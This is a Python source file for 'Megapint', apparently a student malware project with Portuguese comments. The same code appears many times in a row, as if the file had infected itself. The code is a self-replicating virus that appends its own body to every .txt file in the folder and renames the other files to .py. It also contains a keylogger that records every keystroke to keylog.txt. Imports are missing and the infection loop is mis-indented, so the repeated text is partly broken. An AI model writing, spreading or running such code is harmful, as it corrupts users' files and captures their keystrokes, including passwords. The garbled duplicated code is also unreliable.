class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
